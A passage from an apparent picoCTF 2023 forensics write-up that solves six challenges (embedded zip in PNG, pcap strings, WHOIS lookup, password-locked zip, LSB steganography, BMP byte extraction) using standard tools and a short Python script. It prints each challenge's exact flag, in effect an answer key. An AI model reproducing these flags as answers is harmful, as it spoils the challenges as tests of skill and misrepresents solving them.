    000000f0: 19 47 1a 30 f8 1a 5a 19  02 40 e3 b3 2b 14 77 46  |.G.0..Z..@..+.wF|
```
As you can see this png image has the header of a zip file. Interesting 😎. So, I went ahead to unzip

>command: unzip flag.png

```             
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ unzip flag.png                          
Archive:  flag.png
warning [flag.png]:  39739 extra bytes at beginning or within zipfile
  (attempting to process anyway)
   creating: secret/
  inflating: secret/flag.png         
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
flag.png  secret
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ cd secret   
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/CTF/picoCTF_2023/forensics/secret]
└─$ ls
flag.png
```
cool, we got another ```flag.png``` image. Taking a look at this image in my file manager I found this

![image](https://user-images.githubusercontent.com/67879936/227006798-7ac59ac6-de8a-4506-bd6a-0a07a1c70eee.png)

Yeah, we got the flag

FLAG:- ```picoCTF{Hiddinng_An_imag3_within_@n_ima9e_82101824}```


<h2>PcapPoisoning Forensics -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/227007350-f6b63c12-da6a-4734-be02-0bbe6407f6b1.png)

This one was quite easy. Downloading the file to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
flag.png  secret  trace.pcap
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file trace.pcap 
trace.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Raw IPv4, capture length 65535)
```
So, this is a pcap file. I didn't want to go through the stress of using wireshark so I grepped the flag out

>command: strings trace.pcap| grep -i "pico"

![image](https://user-images.githubusercontent.com/67879936/227007868-3bda3353-4c32-45fe-8136-f78e1da6af10.png)

cool, we got our flag. As I said it was quite easy lool

FLAG:- ```picoCTF{P64P_4N4L7S1S_SU55355FUL_0f2d7dc9}```


<h2>who is it Forensics -- 100 points</h2>

![image](https://user-images.githubusercontent.com/67879936/227008613-63578643-58cc-47f7-a30d-6f4cf5c288c2.png)

Lets download the email file to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
email-export.eml  flag.png  secret  trace.pcap
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file email-export.eml 
email-export.eml: SMTP mail, ASCII text, with CRLF line terminators
```
So, I opened the file with ```gedit```, 

![image](https://user-images.githubusercontent.com/67879936/227009983-ac12165b-0f9b-4304-bf19-1c816ab881d8.png)

Going through the mail, I found an IP address

![image](https://user-images.githubusercontent.com/67879936/227010305-00d15823-c035-4bae-8ffa-88c42185031c.png)

From the hint provided "**_whois can be helpful on IP addresses also, not only domain names._**". This means we can run the ```whois``` command on this ip address

>command: whois 173.249.33.206

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ whois 173.249.33.206

#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#


NetRange:       173.249.0.0 - 173.249.63.255
CIDR:           173.249.0.0/18
NetName:        RIPE
NetHandle:      NET-173-249-0-0-1
Parent:         NET173 (NET-173-0-0-0-0)
NetType:        Early Registrations, Transferred to RIPE NCC
OriginAS:       
Organization:   RIPE Network Coordination Centre (RIPE)
RegDate:        2017-09-14
Updated:        2017-09-14
Ref:            https://rdap.arin.net/registry/ip/173.249.0.0

ResourceLink:  https://apps.db.ripe.net/search/query.html
ResourceLink:  whois://whois.ripe.net


OrgName:        RIPE Network Coordination Centre
OrgId:          RIPE
Address:        P.O. Box 10096
City:           Amsterdam
StateProv:      
PostalCode:     1001EB
Country:        NL
RegDate:        
Updated:        2013-07-29
Ref:            https://rdap.arin.net/registry/entity/RIPE

ReferralServer:  whois://whois.ripe.net
ResourceLink:  https://apps.db.ripe.net/search/query.html

OrgTechHandle: RNO29-ARIN
OrgTechName:   RIPE NCC Operations
OrgTechPhone:  +31 20 535 4444 
OrgTechEmail:  hostmaster@ripe.net
OrgTechRef:    https://rdap.arin.net/registry/entity/RNO29-ARIN

OrgAbuseHandle: ABUSE3850-ARIN
OrgAbuseName:   Abuse Contact
OrgAbusePhone:  +31205354444 
OrgAbuseEmail:  abuse@ripe.net
OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE3850-ARIN


#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#



Found a referral to whois.ripe.net.

% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See http://www.ripe.net/db/support/db-terms-conditions.pdf

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '173.249.32.0 - 173.249.63.255'

% Abuse contact for '173.249.32.0 - 173.249.63.255' is 'abuse@contabo.de'

inetnum:        173.249.32.0 - 173.249.63.255
netname:        CONTABO
descr:          Contabo GmbH
country:        DE
org:            ORG-GG22-RIPE
admin-c:        MH7476-RIPE
tech-c:         MH7476-RIPE
status:         ASSIGNED PA
mnt-by:         MNT-CONTABO
created:        2018-08-22T07:28:02Z
last-modified:  2018-08-22T07:28:02Z
source:         RIPE

organisation:   ORG-GG22-RIPE
org-name:       Contabo GmbH
country:        DE
org-type:       LIR
remarks:        * Please direct all complaints about Internet abuse like Spam, hacking or scans *
remarks:        * to abuse@contabo.de . This will guarantee fastest processing possible. *
address:        Aschauer Strasse 32a
address:        81549
address:        Munchen
address:        GERMANY
phone:          +498921268372
fax-no:         +498921665862
abuse-c:        MH12453-RIPE
mnt-ref:        RIPE-NCC-HM-MNT
mnt-ref:        MNT-CONTABO
mnt-ref:        MNT-OCIRIS
mnt-by:         RIPE-NCC-HM-MNT
mnt-by:         MNT-CONTABO
created:        2009-12-09T13:41:08Z
last-modified:  2021-09-14T10:49:04Z
source:         RIPE # Filtered

person:         Wilhelm Zwalina
address:        Contabo GmbH
address:        Aschauer Str. 32a
address:        81549 Muenchen
phone:          +49 89 21268372
fax-no:         +49 89 21665862
nic-hdl:        MH7476-RIPE
mnt-by:         MNT-CONTABO
mnt-by:         MNT-GIGA-HOSTING
created:        2010-01-04T10:41:37Z
last-modified:  2020-04-24T16:09:30Z
source:         RIPE

% Information related to '173.249.32.0/23AS51167'

route:          173.249.32.0/23
descr:          CONTABO
origin:         AS51167
mnt-by:         MNT-CONTABO
created:        2018-02-01T09:50:10Z
last-modified:  2018-02-01T09:50:10Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.106 (ABERDEEN)
```
The task was to look for the owner of the mail server, and from our ```whois``` scan we find the name ```Wilhelm Zwalina```. I think we found our flag already.

FLAG:- ```picoCTF{WilhelmZwalina}```



<h2>FindAndOpen Forensics -- 200 points</h2>

![image](https://user-images.githubusercontent.com/67879936/227011475-4edf9061-8f63-4769-821b-edb25ddf0182.png)

Downloading the 2 files to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
dump.pcap  email-export.eml  flag.png  flag.zip  secret  trace.pcap
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file dump.pcap
dump.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file flag.zip 
flag.zip: Zip archive data, at least v1.0 to extract, compression method=store
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag password: 
   skipping: flag                    incorrect password
```
We have a pcap file and also a zip file. To unzip the flag.zip file we need to provide a password. Checking the hints "**_Download the pcap and look for the password or flag._**"

Lets analyze the pcap file using wireshark

![image](https://user-images.githubusercontent.com/67879936/227106598-b666babf-4b9a-43bb-98cc-6364c5ac1a8b.png)
![image](https://user-images.githubusercontent.com/67879936/227107398-3ebc1bc0-6acd-442d-b1ed-390909426536.png)

Now. this looks like base64, copying it as printable text you have this ```BBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8=```

Lets decrypt this with cyberchef

![image](https://user-images.githubusercontent.com/67879936/227107620-b706748e-1577-4411-b30d-7c2a8108bece.png)

cool, we got the half part of the flag. ```picoCTF{R34DING_LOKd_```. I went on looking for a password in this pcap file lool. It sure took me a while in noticing that this half part of the flag is actually the password needed to unzip the zip file.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ unzip flag.zip
Archive:  flag.zip
[flag.zip] flag password: 
 extracting: flag
```
cool, lets read the content of the flag file

![image](https://user-images.githubusercontent.com/67879936/227108021-8929e85d-2d7c-4c0f-ac39-49647ee2f698.png)

we got our flag

FLAG:- ```picoCTF{R34DING_LOKd_fil56_succ3ss_0f2afb1a}```


<h2>MSB Forensics -- 200 points</h2>

![image](https://user-images.githubusercontent.com/67879936/227108243-96a19e7e-0169-4276-a8a3-bf94b917a83b.png)

Downloading the file to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
dump.pcap  email-export.eml  flag  flag.png  flag.zip  Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png  secret  trace.pcap
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png 
Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png: PNG image data, 1074 x 1500, 8-bit/color RGB, non-interlaced
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ exiftool Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png 
ExifTool Version Number         : 12.57
File Name                       : Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png
Directory                       : .
File Size                       : 3.4 MB
File Modification Date/Time     : 2023:03:23 06:04:52+01:00
File Access Date/Time           : 2023:03:23 06:04:58+01:00
File Inode Change Date/Time     : 2023:03:23 06:04:52+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1074
Image Height                    : 1500
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 1074x1500
Megapixels                      : 1.6
```
we got a png file. Lets make use of the zsteg tool to see if we can extract any information

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ zsteg Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png 
imagedata           .. text: "~~~|||}}}"
b1,g,lsb,xy         .. file: Common Data Format (Version 2.5 or earlier) data
b1,g,msb,xy         .. file: Common Data Format (Version 2.5 or earlier) data
b2,r,lsb,xy         .. text: ["U" repeated 8 times]
b2,g,lsb,xy         .. file: Matlab v4 mat-file (little endian) \252\252\252\252\252\252\252\252, numeric, rows 4294967295, columns 4294967295
b2,g,msb,xy         .. file: Matlab v4 mat-file (little endian) UUUUUUUU, numeric, rows 4294967295, columns 4294967295
b2,b,lsb,xy         .. text: ["U" repeated 8 times]
b4,r,lsb,xy         .. text: ["w" repeated 8 times]
b4,r,msb,xy         .. text: ["U" repeated 12 times]
b4,g,msb,xy         .. text: ["w" repeated 16 times]
b4,b,lsb,xy         .. text: "\"\"\"\"\"\"\"\"4DC\""
b4,b,msb,xy         .. text: "wwwwwwww3333"`
```
oops, nothing 🙃

After researching for a while, I got to know about a tool called ```stegoveritas```. This is a tool that extract data from image files including LSB images.

To install this tool: ```pip3 install stegoveritas```

>command: stegoveritas -extractLSB -steghide -bruteLSB Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ stegoveritas -extractLSB -steghide -bruteLSB Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png 
Running Module: SVImage
+---------------------------+------+
|        Image Format       | Mode |
+---------------------------+------+
| Portable network graphics | RGB  |
+---------------------------+------+
Extracting ([],[],[],[])
Extracted to /home/bl4ck4non/Downloads/CTF/picoCTF_2023/forensics/results/LSBExtracted.bin
Found something worth keeping!
ASCII text
+--------+------------------+-----------------------------------------------------------------------------------------------+-----------+
| Offset | Carved/Extracted | Description                                                                                   | File Name |
+--------+------------------+-----------------------------------------------------------------------------------------------+-----------+
| 0x460d | Carved           | LZMA compressed data, properties: 0xBE, dictionary size: 0 bytes, uncompressed size: 64 bytes | 460D.7z   |
| 0x460d | Extracted        | LZMA compressed data, properties: 0xBE, dictionary size: 0 bytes, uncompressed size: 64 bytes | 460D      |
+--------+------------------+-----------------------------------------------------------------------------------------------+-----------+
Found something worth keeping!
Common Data Format (Version 2.5 or earlier) data
Found something worth keeping!
Matlab v4 mat-file (little endian) UUUUUUUU, numeric, rows 4294967295, columns 4294967295
Running Module: MultiHandler

                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
dump.pcap  email-export.eml  flag  flag.png  flag.zip  Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png  results  secret  trace.pcap
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ cd results 
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/CTF/picoCTF_2023/forensics/results]
└─$ ls
keepers  LSBExtracted.bin
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/CTF/picoCTF_2023/forensics/results]
└─$ cd keepers 
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/picoCTF_2023/forensics/results/keepers]
└─$ ls
1679548564.63637-3ff6f41e1846544c1c6014020bd22e12    1679548578.9468153-0d8280b50b7f6b030a257b2f0a24288c  460D.7z
1679548575.7949412-663c8008fe204f85e9a1cb4776b7e64d  460D
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/picoCTF_2023/forensics/results/keepers]
└─$ strings 1679548564.63637-3ff6f41e1846544c1c6014020bd22e12| grep -i "pico"
picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c}
```
cool, we got our flag

FLAG:- ```picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c}```



<h2>Invisible_WORDs Forensics -- 300 points</h2>

![image](https://user-images.githubusercontent.com/67879936/227110827-5551d0a7-d6a7-46f4-9911-f31dd50192ee.png)

Lets download this image to our machine

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ ls
dump.pcap  email-export.eml  flag  flag.png  flag.zip  Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png  output.bmp  results  secret  trace.pcap
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ file output.bmp                                             
output.bmp: PC bitmap, Windows 98/2000 and newer format, 960 x 540 x 32, cbSize 2073738, bits offset 138
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/picoCTF_2023/forensics]
└─$ exiftool output.bmp                                             
ExifTool Version Number         : 12.57
File Name                       : output.bmp
Directory                       : .
File Size                       : 2.1 MB
File Modification Date/Time     : 2023:03:23 11:25:17+01:00
File Access Date/Time           : 2023:03:23 11:26:42+01:00
File Inode Change Date/Time     : 2023:03:23 11:25:17+01:00
File Permissions                : -rw-r--r--
File Type                       : BMP
File Type Extension             : bmp
MIME Type                       : image/bmp
BMP Version                     : Windows V5
Image Width                     : 960
Image Height                    : 540
Planes                          : 1
Bit Depth                       : 32
Compression                     : Bitfields
Image Length                    : 2073600
Pixels Per Meter X              : 11811
Pixels Per Meter Y              : 11811
Num Colors                      : Use BitDepth
Num Important Colors            : All
Red Mask                        : 0x00007c00
Green Mask                      : 0x000003e0
Blue Mask                       : 0x0000001f
Alpha Mask                      : 0x00000000
Color Space                     : sRGB
Rendering Intent                : Proof (LCS_GM_GRAPHICS)
Image Size                      : 960x540
Megapixels                      : 0.518
```
okay, this is a bitmap file. I viewed this file on cyberchef and found something interesting

![image](https://user-images.githubusercontent.com/67879936/227176480-6d0e0cc2-e197-40cb-8836-982132c51543.png)

As you can see the  header of this image we see ```PK```, similar to the previous challenge we solved it is meant to be a zip file, but there are some bits before ```PK```, so what we have to do is remove them. To do this I used a python script

```
with open('output.bmp', 'rb') as f:
    f.seek(140)  # Move the file pointer to byte 140
    data = f.read()  # Read the remaining bytes from the file starting from byte 140

    # Create a sequence of indices starting from 0 and incrementing by 4 up to the length of f
    indices = range(0, len(data), 4)

    # Create a list of byte strings, where each element is a slice of f that starts at the current index x
    # and extends to the next index x+2
    byte_strings = [data[i:i+2] for i in indices]

    # Write the list of byte strings to a file
    with open('output.txt', 'wb') as f:
        for byte_string in byte_strings:
            f.write(byte_string)

    print('File written successfully.')  # Output success message
```
This script is extracting every second byte from the BMP image file and writing the extracted bytes to a new binary file. You should know  that the resulting file may have a different format than the original BMP file.

Now, lets save this script in a ```.py``` file and run it in the same directory where we have our ```output.bmp``` file. 

>command: python omor.py

![image](https://user-images.githubusercontent.com/67879936/227178658-e35272ea-c451-4db0-94df-e19ca41eeab0.png)

As you can see we now have a zip file. Lets use binwalk to extract information from this

>command: binwalk -e output.txt

![image](https://user-images.githubusercontent.com/67879936/227179574-5daf4aa2-7e7f-4d47-8ffd-957cf3caf70f.png)

we found our flag hehe

FLAG:- ```picoCTF{w0rd_d4wg_y0u_f0und_5h3113ys_m4573rp13c3_a23dfbd4}```


















































